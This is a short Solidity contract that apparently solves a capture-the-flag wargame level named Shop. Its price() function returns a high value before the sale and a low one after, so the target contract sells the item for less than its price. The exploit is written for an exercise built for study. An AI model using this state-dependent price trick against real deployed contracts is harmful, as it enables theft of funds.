pragma solidity ^0.8.0;

import 'levels/Shop.sol';

contract ShopHack is Buyer {
  function price() external view returns (uint256) {
    return Shop(msg.sender).isSold() ? 1 : 101;
  }

  function hack(address _shop) external {
    Shop(_shop).buy();
  }
}
